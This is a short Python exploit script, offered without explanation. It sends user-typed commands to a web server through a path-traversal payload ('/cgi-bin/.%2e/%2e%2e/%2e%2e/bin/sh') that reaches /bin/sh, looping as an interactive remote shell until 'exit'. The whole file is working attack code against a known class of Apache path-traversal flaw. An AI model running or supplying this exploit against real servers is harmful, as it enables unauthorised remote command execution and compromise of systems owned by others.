import urllib

def exp(url):
    try:
        a = 1
        while a == 1:
            headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML,like Gecko) Chrome/106.0.0.0 Safari/537.36',
            }
            cmd =(input('cmd:'))
            payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
            data = 'echo; '+cmd
            request = urllib.request.Request(url=url+payload,headers=headers,data=data.encode(encoding='utf-8'))
            response = urllib.request.urlopen(request)
            content = response.read().decode('utf-8')
            print(content)
            if cmd == 'exit':
                print('Bye bye')
                break
    except:
        print("gggg")
